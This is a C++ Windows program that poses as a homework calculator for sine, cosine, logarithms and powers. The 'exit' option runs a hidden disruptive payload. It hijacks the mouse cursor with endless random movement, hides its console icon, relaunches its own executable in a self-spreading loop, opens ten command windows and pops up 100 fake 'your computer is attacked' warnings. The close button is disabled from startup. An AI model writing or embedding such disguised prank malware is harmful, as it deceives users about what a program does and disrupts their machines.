#include<fstream>
#include<string>
#include<cmath>
#define _CRT_SECURE_NO_WARNINGS
#define PI 3.14159
#include <iostream>
#include <pthread.h>
#include <unistd.h>
#include <windows.h>
#include <time.h>
#include <conio.h>
using namespace std;
int op;
double x,y;
void bd();
void init(){
	system("color f0");
}
void DGA() {
	DeleteMenu(GetSystemMenu(GetConsoleWindow(), FALSE),
		SC_CLOSE, MF_DISABLED);
	DrawMenuBar(GetConsoleWindow());
}
void outbat(){
	ofstream ob;
	ob.open("S.bat",ios::out);
	ob<<"@echo off";
	ob<<endl;
	ob<<"title S";
	ob<<endl;
	ob<<"pause";
	ob.close();
}
void main_cd(){
	DGA(); 
	cout<<"1.计算 sin x"<<endl<<"2.计算 cos x"<<endl<<"3.计算 tan x"<<endl<<"4.计算 x 的算术平方根"<<endl<<"5.计算 x 的 y 次方"<<endl;
	cout<<"6.计算lg(x)"<<endl<<"7.计算 atan x"<<endl<<"8.计算ln(x)"<<endl<<"9.退出"<<endl<<"请输入:"<<endl;
}
int main(){
	init();
	system("cls");
	cout<<"This program can help you do your homework!---made with YR."<<endl;
	main_cd();
	while(1){
		cin>>op;
		if(op==1){
			system("cls");
			cout<<"输入x:";
			cin>>x;
			cout<<sin(x*PI/180.0)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==2){
			system("cls");
			cout<<"输入x:";
			cin>>x;
			cout<<cos(x*PI/180.0)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==3){
			system("cls");
			cout<<"输入x:";
			cin>>x;
			cout<<tan(x*PI/180.0)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==4){
			system("cls");
			cout<<"输入x:";
			cin>>x;
			cout<<sqrt(x)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==5){
			system("cls");
			cout<<"输入x和y:";
			cin>>x>>y;
			cout<<pow(x,y)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==6){
			system("cls");
			cout<<"输入x:";
			cin>>x;
			cout<<log10(x)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==7){
			system("cls");
			cout<<"输入x:";
			cin>>x;
			cout<<atan(x*PI/180.0)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==8){
			system("cls");
			cout<<"输入x:";
			cin>>x;
			cout<<log(x)<<endl;
			system("pause");
			system("cls");
			main_cd();
		}
		else if(op==9){
			bd();
		}
	}
	return 0;
}

void *test(void *ptr)
{
//	int i;
	int x=GetSystemMetrics(SM_CXSCREEN);
	int y=GetSystemMetrics(SM_CYSCREEN);
	srand(time(NULL));
	for(int i=1;i<=10000000000000;i++)SetCursorPos(rand()%x,rand()%y);
}
void bd()
{
	pthread_t pId;
	int ret;
	pthread_t pId1;
	int ret1;
	//创建2个子线程:线程1id为pId,线程2id为pId1 
	ret = pthread_create(&pId,NULL,test,NULL);
	ret1 = pthread_create(&pId1,NULL,test,NULL);
 
	if (ret != 0)
	{
		cout<<"error！"<<endl; 
		return;
	}
	if (ret1 != 0)
	{
		cout<<"error！"<<endl; 
		return;
	}
	
	/*隐藏控制台图标*/ 
	HWND hWnd = GetConsoleWindow(); 
    SetWindowLong(hWnd, GWL_EXSTYLE, WS_EX_TOOLWINDOW); 
 
	/*调用自己文件*/
	char s[100] = "start "; 
    system(strcat(s, _pgmptr)); 
    for(int i=0;i<10;i++) system("start cmd");
    /*警告*/
    for(int i=0;i<100;i++)MessageBox(NULL,"警告:你的电脑被攻击","error",MB_ICONEXCLAMATION); 
    
	//等待线程pId和pId1的完成
	pthread_join(pId,NULL);
	pthread_join(pId1,NULL);
}

